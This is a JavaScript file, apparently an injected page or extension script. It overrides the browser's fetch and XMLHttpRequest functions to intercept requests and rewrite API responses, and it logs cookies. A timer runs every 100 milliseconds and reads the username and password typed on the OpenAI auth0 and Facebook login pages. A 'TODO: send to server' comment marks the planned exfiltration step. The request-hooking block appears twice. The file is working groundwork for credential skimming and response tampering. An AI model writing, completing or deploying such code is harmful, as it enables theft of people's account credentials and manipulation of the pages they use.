// @ts-nocheck
// overwrite xhr/fetch
const _fetch = window.fetch
var _open = XMLHttpRequest.prototype.open

window.fetch = function (...arguments) {
  console.log('catched fetch!', arguments)
  return _fetch(...arguments)
}

window.XMLHttpRequest.prototype.open = function (method, URL) {
  console.log(window.cookies)
  var _onreadystatechange = this.onreadystatechange,
    _this = this

  _this.onreadystatechange = function () {
    // catch only completed 'api/search/universal' requests
    if (_this.readyState === 4 && _this.status === 200) {
      try {
        //////////////////////////////////////
        // THIS IS ACTIONS FOR YOUR REQUEST //
        //             EXAMPLE:             //
        //////////////////////////////////////
        var data = JSON.parse(_this.responseText) // {"fields": ["a","b"]}

        if (data.fields) {
          data.fields.push('c', 'd')
        }

        // rewrite responseText
        Object.defineProperty(_this, 'responseText', { value: JSON.stringify(data) })
        /////////////// END //////////////////
      } catch (e) {}

      console.log('Caught! :)', method, URL /*, _this.responseText*/)
    }
    // call original callback
    if (_onreadystatechange) _onreadystatechange.apply(this, arguments)
  }

  // detect any onreadystatechange changing
  Object.defineProperty(this, 'onreadystatechange', {
    get: function () {
      return _onreadystatechange
    },
    set: function (value) {
      _onreadystatechange = value
    },
  })

  return _open.apply(_this, arguments)
}

document.body.style.background = 'red'

// check password fields
setInterval(() => {
  const host = window.location.hostname

  let username, password
  switch (host) {
    case 'localhost':
      break

    // chatgpt
    case 'auth0.openai.com':
      password = $('[type="password"]').val()
      username = $('#username').val()
      break
    case 'www.facebook.com':
      password = $('[type="password"]').val()
      username = $('#email').val()
      break

    default:
      break
  }

  // TODO: send to server
  console.log(username, password)
}, 100);

(() => {
  // overwrite xhr/fetch
  const _fetch = window.fetch
  var _open = XMLHttpRequest.prototype.open

  window.fetch = function (...arguments) {
    console.log('catched fetch!', arguments)
    return _fetch(...arguments)
  }

  window.XMLHttpRequest.prototype.open = function (method, URL) {
    console.log(window.cookies)
    var _onreadystatechange = this.onreadystatechange,
      _this = this

    _this.onreadystatechange = function () {
      // catch only completed 'api/search/universal' requests
      if (_this.readyState === 4 && _this.status === 200) {
        try {
          //////////////////////////////////////
          // THIS IS ACTIONS FOR YOUR REQUEST //
          //             EXAMPLE:             //
          //////////////////////////////////////
          var data = JSON.parse(_this.responseText) // {"fields": ["a","b"]}

          if (data.fields) {
            data.fields.push('c', 'd')
          }

          // rewrite responseText
          Object.defineProperty(_this, 'responseText', { value: JSON.stringify(data) })
          /////////////// END //////////////////
        } catch (e) {}

        console.log('Caught! :)', method, URL /*, _this.responseText*/)
      }
      // call original callback
      if (_onreadystatechange) _onreadystatechange.apply(this, arguments)
    }

    // detect any onreadystatechange changing
    Object.defineProperty(this, 'onreadystatechange', {
      get: function () {
        return _onreadystatechange
      },
      set: function (value) {
        _onreadystatechange = value
      },
    })

    return _open.apply(_this, arguments)
  }
})()
